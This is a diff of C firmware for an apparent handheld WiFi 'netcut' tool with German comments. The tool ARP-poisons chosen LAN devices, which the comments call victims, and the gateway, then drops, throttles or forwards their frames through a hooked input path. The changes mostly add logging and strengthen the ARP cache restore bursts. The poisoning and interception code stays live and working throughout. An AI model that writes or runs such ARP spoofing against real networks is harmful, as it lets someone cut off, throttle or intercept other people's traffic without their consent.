@@ -20,8 +20,14 @@
 #define ARP_FRAME_SIZE (SIZEOF_ETH_HDR + 28)
 
 #define NETCUT_REPOISON_MS    1000
-#define NETCUT_RESTORE_MS     500
-#define NETCUT_RESTORE_WINDOW 5000
+// Restore aggressiver: häufigere Bursts, längeres Fenster — das WLAN
+// verliert ARP-Frames gerne mal, und der Cache des Opfers (typ. 1-5 min)
+// muss aktiv überschrieben werden, sonst bleibt Restspoofing hängen.
+#define NETCUT_RESTORE_MS     250
+#define NETCUT_RESTORE_WINDOW 10000
+// Beim Hard-Stop nochmal mehrere Bursts in schneller Folge.
+#define NETCUT_STOP_BURSTS      5
+#define NETCUT_STOP_BURST_MS    100
 
 // Maximaler L2-Frame: 14 Byte ETH + 1500 MTU + bisschen Reserve.
 #define NETCUT_FWD_BUF_SIZE 1600
@@ -127,7 +133,10 @@ static void build_arp(
 static void poison_one(
     const uint8_t my_mac[6], const uint8_t gw_mac[6], uint32_t gw_ip,
     const uint8_t dev_mac[6], uint32_t dev_ip) {
-    if(mac_eq(dev_mac, my_mac) || mac_eq(dev_mac, gw_mac)) return;
+    if(mac_eq(dev_mac, my_mac) || mac_eq(dev_mac, gw_mac)) {
+        ESP_LOGW(TAG, "poison_one: skip — dev == my/gw");
+        return;
+    }
 
     uint8_t dev_ip4[4], gw_ip4[4];
     memcpy(dev_ip4, &dev_ip, 4);
@@ -137,12 +146,23 @@ static void poison_one(
     // An Opfer: "Gateway IP ist bei MEINER MAC".
     build_arp(buf, dev_mac, my_mac, ARP_REPLY,
               my_mac, gw_ip4, dev_mac, dev_ip4);
-    wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE);
+    bool ok1 = wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE);
 
     // An Gateway: "Opfer IP ist bei MEINER MAC".
     build_arp(buf, gw_mac, my_mac, ARP_REPLY,
               my_mac, dev_ip4, gw_mac, gw_ip4);
-    wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE);
+    bool ok2 = wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE);
+
+    static uint32_t poison_log_counter = 0;
+    if((poison_log_counter++ & 0x07) == 0) {
+        // alle 8 Aufrufe einen Log
+        ESP_LOGI(TAG,
+            "poison: dev=%u.%u.%u.%u (%02x:%02x:%02x:%02x:%02x:%02x) "
+            "tx_victim=%d tx_gw=%d",
+            dev_ip4[0], dev_ip4[1], dev_ip4[2], dev_ip4[3],
+            dev_mac[0], dev_mac[1], dev_mac[2], dev_mac[3], dev_mac[4], dev_mac[5],
+            ok1, ok2);
+    }
 }
 
 static void restore_one(
@@ -156,34 +176,83 @@ static void restore_one(
     memcpy(gw_ip4, &gw_ip, 4);
 
     uint8_t buf[ARP_FRAME_SIZE];
+    int sent = 0;
 
-    // Opfer: "Gateway IP = echte GW MAC" (2× unicast + 1× broadcast Request).
+    // 1) Opfer-cache überschreiben: 3× unicast Reply "gw_ip = echte gw_mac"
     build_arp(buf, dev_mac, gw_mac, ARP_REPLY,
               gw_mac, gw_ip4, dev_mac, dev_ip4);
-    wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE);
-    wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE);
+    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
+    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
+    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
 
+    // 2) Broadcast Request vom GW — zwingt Opfer zur Antwort + andere im
+    //    LAN zum Cache-Refresh.
     build_arp(buf, bcast, gw_mac, ARP_REQUEST,
               gw_mac, gw_ip4, bcast, dev_ip4);
-    wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE);
+    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
 
-    // Gateway: "Opfer IP = echte Opfer-MAC" (analog).
+    // 3) Gratuitous Reply vom GW (broadcast) — "Hi all, gw_ip is at gw_mac".
+    //    Das überschreibt jeden Cache der noch my_mac für die GW-IP hat.
+    build_arp(buf, bcast, gw_mac, ARP_REPLY,
+              gw_mac, gw_ip4, bcast, gw_ip4);
+    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
+    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
+
+    // 4) Gateway-cache überschreiben: 3× unicast Reply "dev_ip = echte dev_mac"
     build_arp(buf, gw_mac, dev_mac, ARP_REPLY,
               dev_mac, dev_ip4, gw_mac, gw_ip4);
-    wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE);
-    wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE);
+    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
+    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
+    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
 
+    // 5) Broadcast Request vom Opfer.
     build_arp(buf, bcast, dev_mac, ARP_REQUEST,
               dev_mac, dev_ip4, bcast, gw_ip4);
-    wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE);
+    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
+
+    // 6) Gratuitous Reply vom Opfer (broadcast).
+    build_arp(buf, bcast, dev_mac, ARP_REPLY,
+              dev_mac, dev_ip4, bcast, dev_ip4);
+    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
+    sent += wlan_hal_send_eth_raw(buf, ARP_FRAME_SIZE) ? 1 : 0;
+
+    static uint32_t restore_log_counter = 0;
+    if((restore_log_counter++ & 0x07) == 0) {
+        ESP_LOGI(TAG,
+            "restore: dev=%u.%u.%u.%u (%02x:%02x:%02x:%02x:%02x:%02x) "
+            "tx_ok=%d/13",
+            dev_ip4[0], dev_ip4[1], dev_ip4[2], dev_ip4[3],
+            dev_mac[0], dev_mac[1], dev_mac[2], dev_mac[3], dev_mac[4], dev_mac[5],
+            sent);
+    }
 }
 
 // ---------------------------------------------------------------------------
 // L2-Input-Hook — lock-free über Seqlock, behandelt sowohl outbound (victim →
 // gateway) als auch inbound (gateway → victim) Frames.
 // ---------------------------------------------------------------------------
+static volatile uint32_t s_hook_total = 0;
+static volatile uint32_t s_hook_dropped = 0;
+static volatile uint32_t s_hook_forwarded = 0;
+static volatile uint32_t s_hook_passed = 0;
+static volatile uint32_t s_hook_last_log_total = 0;
+
 static err_t netcut_input_hook(struct pbuf* p, struct netif* inp) {
     WlanNetcut* nc = s_hook_engine;
+    s_hook_total++;
+    // Nur grobe Statistik — bei jeder 200. Frame ein Sample, damit der Log
+    // nicht explodiert. Cut/Throttle würde sonst Hunderte Frames/s loggen.
+    if(s_hook_total - s_hook_last_log_total >= 200) {
+        s_hook_last_log_total = s_hook_total;
+        ESP_LOGI(TAG, "hook stats: total=%lu dropped=%lu forwarded=%lu passed=%lu "
+            "engine=%p devices=%u",
+            (unsigned long)s_hook_total,
+            (unsigned long)s_hook_dropped,
+            (unsigned long)s_hook_forwarded,
+            (unsigned long)s_hook_passed,
+            nc,
+            nc ? nc->device_count : 0);
+    }
     if(!nc || !p || p->len < SIZEOF_ETH_HDR) goto pass;
 
     // Wenn apply() gerade die Tabelle umbaut (odd seq) → Frame durchlassen.
@@ -270,17 +339,20 @@ static err_t netcut_input_hook(struct pbuf* p, struct netif* inp) {
                     memcpy(s_fwd_buf + 6, nc->my_mac, 6);
                 }
                 wlan_hal_send_eth_raw(s_fwd_buf, pkt_len);
+                s_hook_forwarded++;
             }
         }
         d->throttle_bucket = bucket;
     }
 
     if(drop) {
+        s_hook_dropped++;
         pbuf_free(p);
         return ERR_OK;
     }
 
 pass:
+    s_hook_passed++;
     if(s_original_input) return s_original_input(p, inp);
     pbuf_free(p);
     return ERR_OK;
@@ -323,6 +395,8 @@ static int32_t netcut_worker_fn(void* ctx) {
     WlanNetcut* nc = (WlanNetcut*)ctx;
     uint32_t last_poison = 0;
     uint32_t last_restore = 0;
+    uint32_t loop_count = 0;
+    ESP_LOGI(TAG, "worker started");
 
     while(!nc->stop_requested) {
         uint32_t now = furi_get_tick();
@@ -368,7 +442,18 @@ static int32_t netcut_worker_fn(void* ctx) {
             nc_unlock(nc);
         }
 
-        if(!keep_running) break;
+        if(!keep_running) {
+            ESP_LOGI(TAG, "worker: no devices keep_running → break (loop=%lu)",
+                (unsigned long)loop_count);
+            break;
+        }
+
+        // Sehr-knapp loggen, max. alle 20 loops (~1 s) wenn was passiert.
+        if(n_jobs > 0 && (loop_count % 20) == 0) {
+            ESP_LOGI(TAG, "worker: loop=%lu n_jobs=%d gw_valid=%d "
+                "poison=%d restore=%d",
+                (unsigned long)loop_count, n_jobs, gw_valid, do_poison, do_restore);
+        }
 
         if(gw_valid) {
             for(int i = 0; i < n_jobs; i++) {
@@ -378,12 +463,17 @@ static int32_t netcut_worker_fn(void* ctx) {
                     restore_one(my_mac, gw_mac, gw_ip, jobs[i].mac, jobs[i].ip);
                 }
             }
+        } else if(n_jobs > 0) {
+            ESP_LOGW(TAG, "worker: %d jobs but no gw_valid — nothing sent",
+                n_jobs);
         }
 
+        loop_count++;
         furi_delay_ms(50);
     }
 
     nc->running = false; // Self-Stop signalisieren — apply/stop joint später.
+    ESP_LOGI(TAG, "worker exiting");
     return 0;
 }
 
@@ -405,11 +495,31 @@ void wlan_netcut_free(WlanNetcut* nc) {
 }
 
 bool wlan_netcut_preflight(WlanNetcut* nc) {
-    if(!nc || !wlan_hal_is_connected()) return false;
+    if(!nc || !wlan_hal_is_connected()) {
+        ESP_LOGW(TAG, "preflight: nc=%p connected=%d",
+            nc, wlan_hal_is_connected());
+        return false;
+    }
     nc->my_ip = wlan_hal_get_own_ip();
     nc->gw_ip = wlan_hal_get_gw_ip();
     nc->netmask = wlan_hal_get_netmask();
-    if(!wlan_hal_get_own_mac(nc->my_mac)) return false;
+    if(!wlan_hal_get_own_mac(nc->my_mac)) {
+        ESP_LOGW(TAG, "preflight: get_own_mac failed");
+        return false;
+    }
+    {
+        const uint8_t* ip = (const uint8_t*)&nc->my_ip;
+        const uint8_t* gw = (const uint8_t*)&nc->gw_ip;
+        const uint8_t* nm = (const uint8_t*)&nc->netmask;
+        const uint8_t* m = nc->my_mac;
+        ESP_LOGI(TAG,
+            "preflight: my_ip=%u.%u.%u.%u gw_ip=%u.%u.%u.%u mask=%u.%u.%u.%u "
+            "my_mac=%02x:%02x:%02x:%02x:%02x:%02x",
+            ip[0], ip[1], ip[2], ip[3],
+            gw[0], gw[1], gw[2], gw[3],
+            nm[0], nm[1], nm[2], nm[3],
+            m[0], m[1], m[2], m[3], m[4], m[5]);
+    }
 
     nc->gw_mac_valid = false;
     LOCK_TCPIP_CORE();
@@ -428,7 +538,13 @@ bool wlan_netcut_preflight(WlanNetcut* nc) {
     UNLOCK_TCPIP_CORE();
 
     if(!nc->gw_mac_valid) {
-        ESP_LOGW(TAG, "preflight: GW MAC not in ARP table");
+        const uint8_t* gw = (const uint8_t*)&nc->gw_ip;
+        ESP_LOGW(TAG, "preflight: GW MAC not in ARP table for %u.%u.%u.%u",
+            gw[0], gw[1], gw[2], gw[3]);
+    } else {
+        const uint8_t* m = nc->gw_mac;
+        ESP_LOGI(TAG, "preflight: gw_mac=%02x:%02x:%02x:%02x:%02x:%02x",
+            m[0], m[1], m[2], m[3], m[4], m[5]);
     }
     return nc->gw_mac_valid;
 }
@@ -446,7 +562,11 @@ static void cleanup_stopped_worker(WlanNetcut* nc) {
 
 static void start_worker(WlanNetcut* nc) {
     cleanup_stopped_worker(nc);
-    if(nc->running) return;
+    if(nc->running) {
+        ESP_LOGI(TAG, "start_worker: already running");
+        return;
+    }
+    ESP_LOGI(TAG, "start_worker: spawning thread + installing L2 hook");
     nc->stop_requested = false;
     nc->worker = furi_thread_alloc();
     furi_thread_set_name(nc->worker, "WlanNetcutW");
@@ -459,6 +579,7 @@ static void start_worker(WlanNetcut* nc) {
 }
 
 static void stop_worker(WlanNetcut* nc) {
+    ESP_LOGI(TAG, "stop_worker: running=%d worker=%p", nc->running, nc->worker);
     if(nc->running) {
         nc->stop_requested = true;
     }
@@ -472,15 +593,37 @@ static void stop_worker(WlanNetcut* nc) {
 }
 
 bool wlan_netcut_apply(WlanNetcut* nc, const WlanDeviceRecord* devices, uint8_t count) {
-    if(!nc) return false;
+    if(!nc) {
+        ESP_LOGW(TAG, "apply: nc=NULL");
+        return false;
+    }
+    ESP_LOGI(TAG, "apply: in_count=%u gw_valid=%d", count, nc->gw_mac_valid);
     if(!nc->gw_mac_valid) {
         wlan_netcut_preflight(nc);
-        if(!nc->gw_mac_valid) return false;
+        if(!nc->gw_mac_valid) {
+            ESP_LOGW(TAG, "apply: aborting — preflight still no gw_mac");
+            return false;
+        }
+    }
+
+    // Eingangsliste loggen — sieht man, ob Block/Throttle pro Device gesetzt ist.
+    for(uint8_t i = 0; i < count; ++i) {
+        const WlanDeviceRecord* dr = &devices[i];
+        const uint8_t* ip = (const uint8_t*)&dr->ip;
+        const uint8_t* m = dr->mac;
+        ESP_LOGI(TAG, "apply: in[%u] ip=%u.%u.%u.%u mac=%02x:%02x:%02x:%02x:%02x:%02x "
+            "active=%d block=%d throttle=%u",
+            i, ip[0], ip[1], ip[2], ip[3],
+            m[0], m[1], m[2], m[3], m[4], m[5],
+            dr->active, dr->block_internet, dr->throttle_kbps);
     }
 
     bool any_active = false;
     bool restore_triggered = false;
-    if(!nc_lock(nc)) return false;
+    if(!nc_lock(nc)) {
+        ESP_LOGE(TAG, "apply: nc_lock failed");
+        return false;
+    }
 
     uint32_t now = furi_get_tick();
     WlanNetcutDevice next[WLAN_APP_MAX_DEVICES];
@@ -577,6 +720,9 @@ bool wlan_netcut_apply(WlanNetcut* nc, const WlanDeviceRecord* devices, uint8_t 
 
     nc_unlock(nc);
 
+    ESP_LOGI(TAG, "apply: published next_count=%u any_active=%d restore_triggered=%d",
+        next_count, any_active, restore_triggered);
+
     if(any_active) {
         start_worker(nc);
     } else {
@@ -623,11 +769,18 @@ void wlan_netcut_stop(WlanNetcut* nc) {
         nc_unlock(nc);
     }
 
-    // Synchron einmal Restore-Frames raus, bevor Worker stoppt — danach
-    // übernimmt niemand mehr.
-    if(gw_valid) {
-        for(int i = 0; i < n_jobs; i++) {
-            restore_one(my_mac, gw_mac, gw_ip, jobs[i].mac, jobs[i].ip);
+    // Synchron mehrere Restore-Bursts raus (NETCUT_STOP_BURSTS Iterationen
+    // mit NETCUT_STOP_BURST_MS Pause), bevor Worker stoppt — auf einem
+    // verlustreichen Link kommt sonst evtl. kein einziger Frame an, und das
+    // Opfer behält den vergifteten ARP-Cache (Timeout typ. 1-5 min).
+    if(gw_valid && n_jobs > 0) {
+        ESP_LOGI(TAG, "stop: firing %d restore bursts for %d devices",
+            NETCUT_STOP_BURSTS, n_jobs);
+        for(int b = 0; b < NETCUT_STOP_BURSTS; b++) {
+            for(int i = 0; i < n_jobs; i++) {
+                restore_one(my_mac, gw_mac, gw_ip, jobs[i].mac, jobs[i].ip);
+            }
+            if(b + 1 < NETCUT_STOP_BURSTS) furi_delay_ms(NETCUT_STOP_BURST_MS);
         }
     }
 
